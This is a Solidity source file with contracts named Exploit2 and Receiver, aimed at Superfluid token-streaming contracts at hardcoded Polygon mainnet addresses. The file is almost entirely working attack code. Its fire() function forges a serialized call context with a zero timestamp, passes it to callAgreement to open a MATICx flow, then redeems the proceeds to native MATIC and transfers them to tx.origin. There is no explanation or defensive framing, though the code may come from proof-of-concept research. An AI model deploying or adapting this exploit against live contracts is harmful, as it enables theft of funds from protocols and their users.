// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "src/Common.sol";

interface ICFA is ISuperAgreement {
    function createFlow(ISuperfluidToken token, address receiver, int96 flowRate, bytes calldata ctx) external returns(bytes memory);
    function deleteFlow(ISuperfluidToken token, address sender, address receiver,  bytes calldata ctx) external returns(bytes memory);
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function WETH() external pure returns (address);
    function exactInputSingle(ISwapRouter.ExactInputSingleParams calldata params) external payable returns (uint256);
}

interface IUniswapV3Pool {
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes memory data) external returns (int256, int256);
}


interface WMATIC is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface MATICx is ISuperToken {
    function upgradeByETH() external payable;
}


contract Receiver {

    WMATIC wmatic;
    MATICx maticx;
    address master;

    constructor() {
        maticx = MATICx(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);
        wmatic = WMATIC(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
        master = msg.sender;
    }
    
    function balanceOf() public view returns (uint256) {
        return maticx.balanceOf(address(this));
    }

    function redeem() public {
        maticx.downgrade(maticx.balanceOf(address(this)));
        wmatic.withdraw(wmatic.balanceOf(address(this)));
        payable(master).transfer(address(this).balance);
    }

    receive () external payable {

    }
}

contract Exploit2 {

    ISuperfluid public superfluid;
    ICFA cfa;
    ISuperToken usdcx;
    MATICx public maticx;
    IERC20 usdc;
    WMATIC wmatic;
    ISwapRouter router;
    IUniswapV3Pool uUSDC;
    Receiver public receiver;


    constructor() {
        superfluid = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
        cfa = ICFA(0x6EeE6060f715257b970700bc2656De21dEdF074C);
        usdcx = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);
        maticx = MATICx(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);
        wmatic = WMATIC(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
        usdc = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
        router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564 );
        uUSDC = IUniswapV3Pool(0xA374094527e1673A86dE625aa59517c5dE346d32); // WMATIC - USDC pool
        receiver = new Receiver();
    }

    function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes calldata data) public {
        wmatic.transfer(address(uUSDC), uint256(amount0));
    }

    function serializeContext(Context memory context)
        private
        returns (bytes memory ctx)
    {
        uint256 callInfo = ContextDefinitions.encodeCallInfo(context.appCallbackLevel, context.callType);
        uint256 creditIO =
            uint128(context.appCreditGranted) |
            (uint256(uint128(context.appCreditWantedDeprecated)) << 128);
        // NOTE: nested encoding done due to stack too deep error when decoding in _decodeCtx
        ctx = abi.encode(
            abi.encode(
                callInfo,
                context.timestamp,
                context.msgSender,
                context.agreementSelector,
                context.userData
            ),
            abi.encode(
                creditIO,
                context.appCreditUsed,
                context.appAddress,
                context.appCreditToken
            )
        );
    }

    function fire() public payable returns (uint256) {

        // buy maticX
        maticx.upgradeByETH{value: address(this).balance}();

        // create a flow between Exploit and Receiver, where ctx has timestamp 0
        Context memory ctx;
        bytes memory _ctx;
        ctx.callType = ContextDefinitions.CALL_INFO_CALL_TYPE_AGREEMENT;
        ctx.timestamp = 0;
        ctx.msgSender = address(this); //victim addrses
        ctx.appCreditToken = maticx;
        ctx.userData = "";
        _ctx = serializeContext(ctx);

        superfluid.callAgreement(
            cfa,
            abi.encodeWithSelector(ICFA.createFlow.selector, maticx, address(receiver), 0.0001052 ether, _ctx, ""),
            ""
        );

        receiver.redeem();
        uint256 amount = address(this).balance;
        payable(address(tx.origin)).transfer(amount);
        return amount;
    }

    function getCFABalance() public view returns (uint256, uint256) {
        IERC20 maticTok = IERC20(maticx.getUnderlyingToken());
        IERC20 usdcTok = IERC20(usdcx.getUnderlyingToken());
        return (address(maticx).balance, usdcTok.balanceOf(address(usdcx)));
    }

    receive() external payable {

    }
}

